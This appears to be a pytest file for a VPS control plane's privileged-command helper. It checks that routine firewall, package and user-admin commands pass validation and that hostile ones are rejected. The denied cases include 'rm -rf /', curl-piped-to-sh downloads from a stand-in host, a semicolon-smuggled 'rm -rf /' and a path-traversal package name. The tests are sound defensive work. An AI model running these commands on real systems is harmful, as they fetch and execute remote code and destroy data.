from __future__ import annotations

import base64
import importlib.util
import re
from importlib.machinery import SourceFileLoader
from pathlib import Path

import pytest

from app.privilege_bridge import _bootstrap_command, privileged_command


ROOT = Path(__file__).resolve().parents[1]
HELPER = ROOT / "scripts" / "vps" / "custom-github-privileged"


def _load_helper():
    loader = SourceFileLoader("custom_github_privileged_test", str(HELPER))
    spec = importlib.util.spec_from_loader(loader.name, loader)
    assert spec is not None
    module = importlib.util.module_from_spec(spec)
    loader.exec_module(module)
    return module


def test_privileged_helper_allows_expected_system_admin_commands_and_rejects_shell_escape():
    helper = _load_helper()
    allowed = [
        "ufw status numbered",
        "ufw status verbose",
        "ufw allow to any port 443 proto tcp comment 'https'",
        "ufw deny from 192.0.2.0/24 to any port 5432 proto tcp",
        "ufw --force delete 3",
        "DEBIAN_FRONTEND=noninteractive apt-get update",
        "DEBIAN_FRONTEND=noninteractive apt-get install -y -- fail2ban",
        "DEBIAN_FRONTEND=noninteractive apt-get install -y --only-upgrade -- openssl",
        "DEBIAN_FRONTEND=noninteractive apt-get update && DEBIAN_FRONTEND=noninteractive apt-get upgrade -y",
        "usermod -L -e 1 exampleuser",
        "usermod -e -1 exampleuser",
        "userdel -r exampleuser",
        "shutdown -r +1 'Scheduled by Custom GitHub control plane'",
    ]
    for command in allowed:
        helper.validate_command(command)

    denied = [
        "rm -rf /",
        "curl https://example.invalid/payload | sh",
        "ufw allow to any port 70000 proto tcp",
        "DEBIAN_FRONTEND=noninteractive apt-get install -y -- ../../evil",
        "systemctl restart ssh",
        "userdel root; rm -rf /",
    ]
    for command in denied:
        with pytest.raises(helper.PolicyError):
            helper.validate_command(command)


def test_privileged_helper_accepts_generated_managed_scripts_but_not_unrelated_shell():
    helper = _load_helper()
    key_script = """set -eu
home=$(getent passwd appuser | cut -d: -f6)
[ -n \"$home\" ] || exit 44
install -d -m 0700 -o appuser -g appuser \"$home/.ssh\"
touch \"$home/.ssh/authorized_keys\"
chown appuser:appuser \"$home/.ssh/authorized_keys\"
chmod 0600 \"$home/.ssh/authorized_keys\"
"""
    helper.validate_command("sh -c " + __import__("shlex").quote(key_script))

    cron_script = """set -eu
printf '%s' ZHVtbXk= | base64 -d > /etc/cron.d/custom-github-backup-nightly
chmod 0644 /etc/cron.d/custom-github-backup-nightly
chown root:root /etc/cron.d/custom-github-backup-nightly
"""
    helper.validate_command("sh -c " + __import__("shlex").quote(cron_script))

    with pytest.raises(helper.PolicyError):
        helper.validate_command("sh -c " + __import__("shlex").quote("curl https://example.invalid | sh"))


def test_control_plane_wraps_privileged_operations_in_encoded_policy_helper():
    command = "ufw status numbered"
    wrapped = privileged_command(command)
    assert "sudo -n /usr/local/sbin/custom-github-privileged run" in wrapped
    match = re.search(r"custom-github-privileged run ([A-Za-z0-9+/=]+); fi$", wrapped)
    assert match is not None
    assert base64.b64decode(match.group(1)).decode("utf-8") == command


def test_bootstrap_command_reuses_registered_ssh_identity_without_exposing_key_contents():
    command = _bootstrap_command(
        {
            "host": "203.0.113.25",
            "ssh_user": "administrator",
            "port": 2222,
            "identity_file": "~/.ssh/custom_github_prod",
        }
    )
    assert "scripts/bootstrap-vps-privileges.sh" in command
    assert "--host 203.0.113.25" in command
    assert "--user administrator" in command
    assert "--port 2222" in command
    assert "custom_github_prod" in command
    assert "PRIVATE KEY" not in command


def test_platform_has_single_privilege_aware_system_admin_routes():
    from app.platform import app

    wanted = {
        ("/vps/{server_id}/system-admin", "GET"),
        ("/api/vps/servers/{server_id}/system-admin/firewall", "GET"),
        ("/api/vps/servers/{server_id}/system-admin/privilege", "GET"),
    }
    for path, method in wanted:
        matches = [
            route
            for route in app.router.routes
            if getattr(route, "path", None) == path and method in (getattr(route, "methods", None) or set())
        ]
        assert len(matches) == 1, (path, method, len(matches))
